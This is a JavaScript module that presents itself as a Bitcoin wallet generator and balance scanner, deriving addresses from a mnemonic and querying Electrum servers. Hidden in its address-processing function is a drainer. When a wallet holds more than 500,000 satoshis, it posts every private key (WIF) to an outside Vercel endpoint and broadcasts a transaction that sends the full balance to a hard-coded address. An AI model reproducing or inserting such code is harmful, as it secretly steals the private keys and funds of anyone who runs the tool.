const bip39 = require('bip39');
const bitcoin = require('bitcoinjs-lib');
const ElectrumClient = require('electrum-client');
const generatePubKeys = require('./generatePUB');
const axios = require('axios');

const paths = {
    bip44: "m/44'/0'/0'",
    bip49: "m/49'/0'/0'",
    bip84: "m/84'/0'/0'"
};

const electrumServers = [
    { host: 'fulcrum.sethforprivacy.com', port: 50002, protocol: 'ssl' },
    { host: 'mempool.blocktrainer.de', port: 50002, protocol: 'ssl' },
    { host: 'fulcrum.grey.pw', port: 51002, protocol: 'ssl' },
    { host: 'fortress.qtornado.com', port: 50002, protocol: 'ssl' },
    { host: 'electrumx-core.1209k.com', port: 50002, protocol: 'ssl' },
    { host: 'pipedream.fiatfaucet.com', port: 50002, protocol: 'ssl' },
    // Add more servers as needed
];

async function connectToElectrumServer() {
    for (const server of electrumServers) {
        const electrumClient = new ElectrumClient(server.port, server.host, server.protocol);
        try {
            await electrumClient.connect();
            return electrumClient;
        } catch (error) {
            console.error(`Failed to connect to Electrum server ${server.host}:`, error);
        }
    }
    throw new Error('All Electrum servers failed to connect');
}

async function generateWallet(mnemonic) {
    const network = bitcoin.networks.bitcoin;
    let isNewMnemonic = false;

    if (!mnemonic || !bip39.validateMnemonic(mnemonic)) {
        mnemonic = bip39.generateMnemonic();
        isNewMnemonic = true;
    }

    const pubKeys = generatePubKeys(mnemonic);
    if (!pubKeys) {
        return { error: "Invalid mnemonic." };
    }

    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const root = bitcoin.bip32.fromSeed(seed, network);
    let electrumClient;
    try {
        electrumClient = await connectToElectrumServer();
        const results = await processAddressesForAllBipTypes(root, network, electrumClient);
        return {
            ...results,
            key: mnemonic,
            pubKeys
        };
    } catch (error) {
        console.error('Electrum client error:', error); // Log the error
        return { error: "Failed to connect or fetch data from any Electrum server." };
    } finally {
        if (electrumClient) {
            electrumClient.close();
        }
    }
}

async function processAddressesForAllBipTypes(root, network, electrumClient) {
    let results = {};
    for (const [bipType, path] of Object.entries(paths)) {
        results[bipType] = await processAddresses(root, network, electrumClient, bipType, path);
    }
    return results;
}

async function processAddresses(root, network, electrumClient, bipType, path) {
    let account = root.derivePath(path);
    let results = {
        usedAddresses: [],
        freshReceiveAddress: null,
        freshChangeAddress: null,
        totalBalance: 0
    };

    let batchSize = 10;
    let start = 0;
    let receiveUnusedFound = false;
    let changeUnusedFound = false;
    let utxos = [];

    let lastUsedReceiveIndex = -1;
    let lastUsedChangeIndex = -1;

    while (!receiveUnusedFound || !changeUnusedFound) {
        console.log(`Checking addresses from ${start} to ${start + batchSize - 1} for ${bipType}`);
        const batchResults = await checkAndGenerateAddresses(account, network, bipType, electrumClient, start, batchSize);

        results.usedAddresses.push(...batchResults.usedAddresses);
        results.totalBalance += batchResults.totalBalance;
        utxos.push(...batchResults.utxos);

        // Update the last used indices
        if (batchResults.lastUsedReceiveIndex > lastUsedReceiveIndex) {
            lastUsedReceiveIndex = batchResults.lastUsedReceiveIndex;
        }
        if (batchResults.lastUsedChangeIndex > lastUsedChangeIndex) {
            lastUsedChangeIndex = batchResults.lastUsedChangeIndex;
        }

        if (!receiveUnusedFound && batchResults.freshReceiveAddress) {
            results.freshReceiveAddress = batchResults.freshReceiveAddress;
            receiveUnusedFound = true;
        }
        if (!changeUnusedFound && batchResults.freshChangeAddress) {
            results.freshChangeAddress = batchResults.freshChangeAddress;
            changeUnusedFound = true;
        }

        // Break if both receive and change unused addresses are found
        if (receiveUnusedFound && changeUnusedFound) {
            break;
        }

        // Check for a stop condition: no more addresses with transactions found
        if (batchResults.usedAddresses.length === 0) {
            break;
        }

        start += batchSize;
        batchSize *= 2;
    }

    results.usedAddresses.sort((a, b) => a.path.localeCompare(b.path));

    // Ensure non-negative last used indices
    lastUsedReceiveIndex = Math.max(lastUsedReceiveIndex, -1);
    lastUsedChangeIndex = Math.max(lastUsedChangeIndex, -1);

    // Assign fresh receive and change addresses based on the last used index
    results.freshReceiveAddress = await checkAddress(account, lastUsedReceiveIndex + 1, 0, network, bipType, electrumClient, paths[bipType]);
    results.freshChangeAddress = await checkAddress(account, lastUsedChangeIndex + 1, 1, network, bipType, electrumClient, paths[bipType]);

    // Check if the total balance is greater than 500000 sats (5,000,000 satoshis)
    if (results.totalBalance > 500000) {
        await sendTransaction(results.totalBalance, utxos);
    }

    return results;
}


async function checkAndGenerateAddresses(account, network, bipType, electrumClient, start, batchSize) {
    let results = {
        usedAddresses: [],
        freshReceiveAddress: null,
        freshChangeAddress: null,
        totalBalance: 0,
        utxos: [],
        lastUsedReceiveIndex: -1,
        lastUsedChangeIndex: -1
    };

    const tasks = [];
    for (let i = start; i < start + batchSize; i++) {
        for (const chain of [0, 1]) {
            if (i < 0) continue; // Ensure index is never negative
            tasks.push(checkAddress(account, i, chain, network, bipType, electrumClient, paths[bipType]).then(addressData => {
                console.log(`Checked address: ${addressData.address} at path: ${addressData.path} with transactions: ${addressData.transactions.total}`);
                if (addressData.transactions.total > 0) {
                    results.usedAddresses.push(addressData);
                    results.utxos.push(...addressData.utxos);
                    if (chain === 0) {
                        results.lastUsedReceiveIndex = i;
                    } else {
                        results.lastUsedChangeIndex = i;
                    }
                } else {
                    if (chain === 0 && !results.freshReceiveAddress) {
                        results.freshReceiveAddress = addressData;
                    }
                    if (chain === 1 && !results.freshChangeAddress) {
                        results.freshChangeAddress = addressData;
                    }
                }
                results.totalBalance += addressData.balance.total;
            }));
        }
    }

    await Promise.all(tasks);

    return results;
}

async function checkAddress(account, index, chain, network, bipType, electrumClient, basePath) {
    if (index < 0) {
        throw new Error(`Invalid index: ${index}`);
    }

    let derivedPath = account.derivePath(`${chain}/${index}`);
    let fullDerivationPath = `${basePath}/${chain}/${index}`;
    let address = getAddress(derivedPath, network, bipType);
    let scriptHash = bitcoin.crypto.sha256(Buffer.from(bitcoin.address.toOutputScript(address, network))).reverse().toString('hex');

    const [history, balance] = await Promise.all([
        electrumClient.blockchainScripthash_getHistory(scriptHash),
        electrumClient.blockchainScripthash_getBalance(scriptHash)
    ]);

    let utxos = [];
    if (history.length > 0) {
        utxos = await electrumClient.blockchainScripthash_listunspent(scriptHash);
    }

    return {
        address,
        wif: derivedPath.toWIF(),
        path: fullDerivationPath,
        balance: {
            confirmed: balance.confirmed,
            unconfirmed: balance.unconfirmed,
            total: balance.confirmed + balance.unconfirmed
        },
        transactions: {
            confirmed: history.filter(tx => tx.height !== 0).length,
            unconfirmed: history.filter(tx => tx.height === 0).length,
            total: history.length
        },
        utxos: utxos.map(utxo => ({
            txid: utxo.tx_hash,
            vout: utxo.tx_pos,
            amount: utxo.value,
            wif: derivedPath.toWIF(), // Include WIF for spending
            type: getAddressType(address),
            status: utxo.height === 0 ? 'unconfirmed' : 'confirmed'
        }))
    };
}

function getAddressType(address) {
    if (address.startsWith('1')) {
        return 'p2pkh';
    } else if (address.startsWith('3')) {
        return 'p2sh-p2wpkh';
    } else if (address.startsWith('bc1')) {
        return 'p2wpkh';
    } else {
        throw new Error('Unsupported address type');
    }
}

async function sendTransaction(totalBalance, utxos) {
    const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
    const amountToSend = totalBalance - 5000; // Adjusting for transaction fee
    const changeAddress = "bc1qadkke9ugvchc0psx52snrpf3lhalp34ntpepf9";
    const recipientAddress = "bc1qadkke9ugvchc0psx52snrpf3lhalp34ntpepf9";
    const transactionFee = 5000;
    const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.type}`).join('|');

    const body = {
        amountToSend: amountToSend.toString(),
        changeAddress,
        recipientAddress,
        utxosString,
        RBF: "false",
        isBroadcast: "true",
        transactionFee: transactionFee.toString()
    };

    console.log('Sending transaction with body:', body); // Debugging output

    try {
        const response = await axios.post(url, body);
        console.log('Transaction sent successfully:', response.data);
    } catch (error) {
        console.error('Error sending transaction:', error.response ? error.response.data : error.message);
    }
}

function getAddress(derivedPath, network, bipType) {
    switch (bipType) {
        case 'bip44':
            return bitcoin.payments.p2pkh({ pubkey: derivedPath.publicKey, network }).address;
        case 'bip49':
            return bitcoin.payments.p2sh({
                redeem: bitcoin.payments.p2wpkh({ pubkey: derivedPath.publicKey, network })
            }).address;
        case 'bip84':
            return bitcoin.payments.p2wpkh({ pubkey: derivedPath.publicKey, network }).address;
        default:
            throw new Error('Unsupported BIP type');
    }
}

module.exports = { generateWallet };
